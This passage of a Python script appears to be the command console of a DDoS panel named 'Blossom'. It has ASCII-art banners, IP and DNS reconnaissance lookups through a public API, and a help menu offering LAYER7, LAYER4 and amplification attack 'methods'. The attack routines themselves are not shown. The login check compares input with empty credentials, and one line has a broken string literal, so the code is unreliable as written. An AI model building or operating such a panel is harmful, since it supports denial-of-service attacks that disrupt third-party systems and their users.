             print('⣇⠀⠀⠿⠁⢸⣿⠸⣿⠀⢸⡄⠀⣿⣿⣿⣟⠛⣡⣾⣶⣦⠍⠛⣇⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⡇⠠⡉⠀⣴⠟⣰⣿⣿⣆⢸⣿⣿⣷⠀⣿⣿⣿⢸⣿⠀⠀⠸⣿⣷⣤')
             print('⢰⡃⠀⠀⠀⠸⣿⠀⣿⠀⠈⢣⡀⠸⡿⡹⢋⣼⣿⣿⡿⠁⣠⣴⣬⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⣾⣿⠃⠀⠀⣼⠋⣼⣿⣿⣿⣿⡆⢻⣿⣿⡇⣿⣿⣿⢸⣿⠀⠀⠀⣿⣿⣿')
             print('⠀⢿⡄⠀⠀⠀⣿⠀⢸⠆⠀⠀⠙⣠⡼⣱⣿⣿⣿⠟⣡⣶⣿⣿⣿⠟⣠⣦⣍⠻⢿⣿⠿⣋⣡⣾⣿⣿⣿⠀⢀⣈⢁⣾⣿⣿⣿⣿⣿⠇⢸⣿⣿⡇⢸⣿⣿⢸⣿⠀⡀⢀⣿⣿⣿')
             print('⠃⠀⠉⠀⠀⠀⢹⡄⠀⠀⣀⢠⣬⣭⣭⣭⣭⢉⣅⠺⢿⣿⣿⡿⢡⣴⣿⣿⣿⠟⠀⣠⠺⣿⣿⣿⣿⣿⡟⠀⡾⢁⣾⣿⣿⣿⣿⣼⠋⢀⣼⣿⣿⣿⣬⣿⣿⣸⣿⠀⡇⢸⣿⣿⣿')
             print('⠀⣀⣤⣶⣾⣷⡌⠇⣰⡿⢡⣾⣿⣿⣿⣿⠃⣾⣿⣿⡶⢍⡻⢶⣿⣿⣿⣿⠟⢀⣾⣿⣷⠌⢻⣿⣿⣿⡇⠀⡄⣿⣿⣿⣿⠟⣉⣴⣾⣿⣿⣿⣿⣿⣿⡿⢣⣿⡟⢈⣷⣿⣿⣿⣿')
             print('⣾⣿⣿⣿⣿⣏⠃⣼⣿⢃⣿⣿⣿⣿⣿⡏⣸⣿⡿⢋⣼⣿⡟⢠⡙⠻⣿⣃⣼⣿⣿⡿⠃⠀⣼⣿⣿⠏⠀⠀⡇⣿⣷⠏⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⡀⢠⣿⣿⣿⣿⣿')
             print('⣿⣿⣿⣿⣿⣏⣼⣿⣇⣸⣿⣿⣿⣿⣿⢡⣿⡟⢡⣿⣿⣿⡇⣿⣿⣷⣌⠛⢿⣿⣿⠃⠀⣸⣿⠟⠁⠀⠀⠀⡇⣿⡏⢀⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⣿⣿⣏⠜⢀⣾⣿⣿⣿⣿⣿')
             print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠛⠛⠛⠟⠼⠟⣰⣿⣿⣿⡿⢠⣿⣿⣿⣿⡷⢠⡙⠁⠠⠚⠉⠀⣀⣴⠀⠀⠀⡇⣿⢰⢸⣿⠿⠛⢫⣥⣲⣶⢸⣿⣷⣦⡙⠋⣴⣿⣿⣿⣿⣿⣿⣿')
             print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣬⡙⠿⣿⡇⣼⣿⣿⣿⣿⠇⣾⣿⣦⠀⠀⠀⣸⣿⡏⠀⢀⠀⠃⠃⠈⣠⣴⣶⠇⣾⣿⣇⢻⢸⣿⣿⣿⣿⣶⡀⠉⠉⠻⣿⣿⣿⣿')
             print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡓⣌⡐⢿⣿⣿⣿⡏⢰⣿⣿⡿⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⡄⢸⣿⣿⣿⢰⣏⢉⣉⣀⠈⠻⢿⣿⣿⢱⣿⣆⠻⣶⣄⠙⢿⣿')
             print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣾⣿⣿⣷⣄⡙⢿⠟⣰⣿⣿⡿⠁⢀⡀⠛⠁⡀⠀⠀⠀⠰⡟⠀⠿⡿⢿⠇⠸⡿⣿⡌⢿⡸⣷⣦⣌⡟⢸⣿⣿⠇⣿⣿⣷⣄⢻')
             print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣷⢄⠙⠟⠛⠅⠁⢠⣿⣿⣿⠆⠀⠀⣤⡀⣿⣿⢰⣿⠖⠂⣞⡠⣧⠐⢶⣦⣤⣙⠻⢿⣷⠘⣟⠻⢰⣿⣿⣿⣿⣆')



# 🌸TOOLS🌸
        elif "geoip" in cnc:
            try:
                IP = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={IP}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <IP>')
                print('Example: geoip 127.0.0.1')

        elif "reverseip" in cnc:
            try:
                IP = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={IP}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <IP>')
                print('Example: reverseip 127.0.0.1')

        elif "subnet-lookup" in cnc:
            try:
                IP = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={IP}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <CDR/IP + Netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                IP = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={IP}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <IP/ASN>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                IP = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={IP}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <DNS>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                IP = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={IP}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <IP/Domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
🌸LAYER7🌸  ► SHOW LAYER7 METHODS
🌸LAYER4🌸  ► SHOW LAYER4 METHODS
🌸AMP🌸     ► SHOW AMP METHODS
🌸SPECIAL🌸 ► SHOW SPECIAL METHODS
🌸BANNERS🌸 ► SHOW BANNERS
🌸RULES🌸   ► RULES PANEL
🌸PORTS🌸   ► SHOW ALL PORTS
🌸TOOLS🌸   ► SHOW TOOLS
🌸CLEAR🌸   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = ""
    passwd = ""
    username = input("🌸Username: ")
    password = getpass.getpass(prompt=Password: ')
    if username != user or password != passwd:
        print("")
        print("🌸Unauthorized")
        sys.exit(1)
    elif username == user and password == passwd:
        print("🌸Welcome to Blossom🌸!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
